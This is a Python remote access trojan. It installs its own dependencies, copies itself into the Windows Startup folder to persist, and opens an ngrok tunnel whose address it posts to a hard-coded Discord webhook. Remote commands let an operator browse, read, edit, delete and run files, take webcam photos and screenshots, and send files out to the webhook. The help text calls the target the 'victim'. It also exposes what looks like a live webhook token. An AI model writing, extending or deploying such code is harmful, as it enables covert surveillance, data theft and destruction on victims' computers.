import os
import socket
import subprocess
from os import name as os_name, system
try:
    from colorama import init, Fore as cc
except:
    subprocess.run(["pip", "install", "colorama"])
    import colorama
import select
import threading
import time
try:
    import discord
except:
    subprocess.run(["pip", "install", "discord.py"])
    import discord
from discord import SyncWebhook
try:
    from git import Repo
except:
    pass
try:
    import pyautogui
except:
    subprocess.run(["pip", "install", "pyautogui"])
    import pyautogui
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET
try:
    from pyngrok import ngrok
except:
    subprocess.run(["pip", "install", "pyngrok"])
    from pyngrok import ngrok

try:
    import shutil
except:
    subprocess.run(["pip", "install", "shutil"])
    import shutil
try:
    import cv2 as cv
except:
    subprocess.run(["pip", "install", "opencv-python"])
    import cv2 as cv
try:
    import win32.lib.win32con as win32con, win32gui
except:
    subprocess.run(["pip", "install", "pywin32"])
    import win32.lib.win32con as win32con, win32gui
import sys
from zipfile import ZipFile
subprocess.run(["ngrok", "authtoken", "AUTH"])
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = os.environ.get(f"socket.gethostname()")
port = 5050
FORMAT = "utf-8"
HEADER = 64
DISCONNECT_MESSAGE = "!disconnect"
# Create a TCP socket
clear = lambda: system('cls') if os_name == 'nt' else system('clear')
# Bind a local socket to the port
server_address = ("", port)
server.bind(server_address)
server.listen(1)

# Open a ngrok tunnel to the socket
public_url = ngrok.connect(port, "tcp", options={"remote_addr": "{}:{}".format(host, port)})
clear()
print("Ngrok Tunnel \"{}\" -> \"tcp://127.0.0.1:{}/\"".format(public_url, port))
webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/954023084753584138/RFewgv20GIYjD9J2_Olm1gyEzVAcmFSNCb0IaAXcdcM1WL3xtDEUNApeLTsa8QZMbN0u")
webhook.send(f"{public_url}")
program = os.path.basename(__file__)
program2 = "startup.bat"
shutil.copy(f"{program}", r"C:\Users\himik\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
shutil.copy(f"{program2}", r"C:\Users\himik\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")

program = win32gui.GetForegroundWindow()
#win32gui.ShowWindow(program , win32con.SW_HIDE)
def handle_client(conn, addr):
    connected = True
    while connected:
        
        msg_length = True
        if msg_length:
            try:
                msg = conn.recv(2048)
                msg = msg.decode(FORMAT)
                print(msg)
                    
                if msg == "SSH-2.0-ssh2js1.4.0\r\n":
                    conn.close()
                if msg == "SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7":
                    conn.close()
                if msg == "SSH-2.0-ssh2js1.4.0":
                    conn.close()
                if msg == DISCONNECT_MESSAGE:
                    connected = False
                    print(f"[Connection {threading.activeCount() -1}] Disconnected")
                    conn.close()
                    return
                if msg == "pwd":
                    conn.send(f"{os.getcwd()}".encode(FORMAT))
                    handle_client(conn, addr)
                if msg == "ls":
                    conn.send(f"{os.listdir()}".encode(FORMAT))
                    handle_client(conn, addr)
                if msg == "getip":
                    hostname = socket. gethostname()
                    local_ip = socket. gethostbyname(hostname)
                    conn.send(f"{local_ip}".encode(FORMAT))
                    handle_client(conn, addr)
                if msg[:2] == 'cd':
                    def cdfolder(conn, addr):
                        try:
                            os.chdir(f"{msg[3:]}")
                            conn.send(f"{os.getcwd()}".encode(FORMAT))
                            handle_client(conn, addr) 
                        except:
                            conn.send("Folder not found!".encode(FORMAT))
                            handle_client(conn, addr)
                    cdfolder(conn, addr)     
                if msg[:3] == "del":
                    def delet(conn, addr):
                        def onerror(func, path, exc_info):
                            import stat
                            if not os.access(path, os.W_OK):
                                os.chmod(path, stat.S_IWUSR)
                                func(path)
                            else:
                                raise
                        if os.path.isdir(f"{msg[4:]}"):
                            try:
                                shutil.rmtree(f"{msg[4:]}")
                                conn.send(f"Folder {msg[4:]} Deleted!".encode(FORMAT))
                                handle_client(conn, addr)
                            except:
                                onerror()
                                handle_client(conn, addr)
                        if os.path.isfile(f"{msg[4:]}"):
                            os.remove(f"{msg[4:]}")
                            conn.send(f"File {msg[4:]} Deleted!".encode(FORMAT))
                            handle_client(conn, addr)
                        if not os.path.exists(f"{msg[4:]}"):
                            conn.send(f"{msg[4:]} Not found!".encode(FORMAT))
                            handle_client(conn, addr)
                    delet(conn, addr)
                if msg[:3] == "git":
                    def clone(conn, addr):
                        try:
                            os.system(f"git clone {msg[4:]}")
                            conn.send("File Cloned Successfully".encode(FORMAT))
                            handle_client(conn, addr)
                        except:
                            print("File Error")
                            conn.send(f"File Error (sometimes i say this when successful)\n{os.listdir()}".encode(FORMAT))
                            handle_client(conn, addr)
                    clone(conn, addr)
                if msg == "snap":
                    def webcam(conn, addr):
                        try:
                            cam = cv.VideoCapture(0)   
                            s, img = cam.read()
                            if s:
                                path = r"selfietest.jpg"
                                cv.imwrite(path, img)
                                webhook.send(file=discord.File('selfietest.jpg'))
                            conn.send("Snapped pic and uploaded!".encode(FORMAT))
                        except:
                            conn.send("Webcam doesnt exist or is being used!".encode(FORMAT))
                            handle_client(conn, addr)
                    webcam(conn, addr)
                if msg == "screenshot":
                    image = pyautogui.screenshot()
                    image.save("screenshot.png")
                    webhook.send(file=discord.File('screenshot.png'))
                    conn.send("Screenshot taken! sent by webhook".encode(FORMAT))
                    handle_client(conn, addr)
                if msg == "kill":
                    def kill(conn, addr):
                        conn.send("Attempting to Kill...".encode(FORMAT))
                        conn.close()
                        exit()                  
                    kill(conn, addr)
                if msg == "create":
                    def create(conn, addr):
                        def create2(conn, addr):
                            def write(conn, addr):
                                conn.send("Input contents".encode(FORMAT))
                                cont = conn.recv(2048).decode(FORMAT)
                                with open(f"{name}.{ext}", "w") as f:
                                    f.write(f"{cont}")
                                    f.close()
                                    conn.send("File created successfully!".encode(FORMAT))
                                    handle_client(conn, addr)
                                
                            conn.send("Input file extension".encode(FORMAT))
                            ext = conn.recv(2048).decode(FORMAT)   
                            write(conn, addr)
                        conn.send("Input a name for the file".encode(FORMAT))
                        global name
                        name = conn.recv(2048).decode(FORMAT)
                        create2(conn, addr)      
                    create(conn, addr)
                    
                if msg[:4] == "edit":
                    nl = '\n'
                    def returnto(conn, addr):
                        conn.sendall("File Edited Successfully".encode(FORMAT))
                        handle_client(conn, addr)
                    if os.path.exists(f"{msg[5:]}"):
                        try:
                            with open(f"{msg[5:]}", "w+") as f:
                                conn.send(f"{f.read()}\n\nInput new content (will overwrite everything else)".encode(FORMAT))
                                newcont = conn.recv(2048).decode(FORMAT)
                                newcont = str(newcont)
                                f.write(f"{newcont}")
                                f.close()
                                
                                returnto(conn, addr)
                        except:
                            conn.send("File doesnt exist!".encode(FORMAT))
                            handle_client(conn, addr)
                    else:
                        conn.send(f"{msg[5:]} Does not exist!")
                        handle_client(conn, addr)
                if msg[:4] == "read":
                    if os.path.exists(f"{msg[5:]}"):
                        try:
                            with open(f"{msg[5:]}", "r") as f:
                                conn.send(f"{f.read()}".encode(FORMAT))
                                handle_client(conn, addr)
                        except:
                            conn.send("File exists but cant be read".encode(FORMAT))
                            handle_client(conn, addr)
                    else:
                        conn.send(f"{msg[5:]} Does not exist!".encode(FORMAT))
                        handle_client(conn, addr)
                if msg[:4] == "exec":
                    if os.path.exists(f"{msg[5:]}"):
                        try:
                            subprocess.Popen([sys.executable, f"{msg[5:]}"])
                            conn.send("File ran successfully".encode(FORMAT))
                            handle_client(conn, addr)
                        except:
                            conn.send("File exists but cant be ran as an executable file or script".encode(FORMAT))
                            handle_client(conn, addr)
                    if not os.path.exists(f"{msg[5:]}"):
                        conn.send("File doesnt exist!".encode(FORMAT))
                        handle_client(conn, addr)
                if msg[:4] == "send":
                    if os.path.isfile(f'{msg[5:]}'):
                       
                        webhook.send(file=discord.File(f'{msg[5:]}'))
                        conn.send("File sent to webhook!".encode(FORMAT))
                        handle_client(conn, addr)
                    if os.path.isdir(f'{msg[5:]}'):   
                        try:
                            f = ZipFile(f'{msg[5:]}.zip', 'w')
                            f.write(f"{msg[5:]}")
                            webhook.send(file=discord.File(f'{f}'))
                            conn.send("File sent to webhook!".encode(FORMAT))
                            handle_client(conn, addr)
                        except:
                            conn.send("File couldnt be packed or sent!".encode(FORMAT))
                            handle_client(conn, addr)
                if msg == "help":
                    conn.send(f'''
                    help                       : Shows this page
                    git <url>                  : Clones Github repository
                    kill                       : Kills communication between client/server
                    cd <file name/ ..>         : Changes directory to specified folder
                    pwd                        : Prints current directory
                    ls                         : Shows folders and files in current directory
                    del <file/folder name>     : Deletes folder/file specified
                    snap                       : Sends picture of webcam to discord webhook
                    screenshot                 : Sends screenshot to discord webhook
                    getip                      : Retrieves victim IP addr
                    create                     : Walks through creation process (can choose name, extension and content)
                    edit <file name>           : Overwrites file content with your choice of input (eg  edit test.txt)
                    read <file name>           : Read selected file (eg  read test.txt)
                    exec <file name.extension> : Runs specified file/script if possible (eg  exec test.py)
                    clear                      : Clears client screen
                    '''.encode(FORMAT)) 
                else:
                    conn.send(f"Command '{msg}' doesnt exist!".encode(FORMAT))
                    handle_client(conn, addr)
            except (ConnectionAbortedError, OSError):
                conn.close()
    conn.close()     
def start():
    server.listen()
    print(f"[LISTENING] Server is listening")
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
    
print("[STARTING] Server is Starting...")
start()

sock.close()
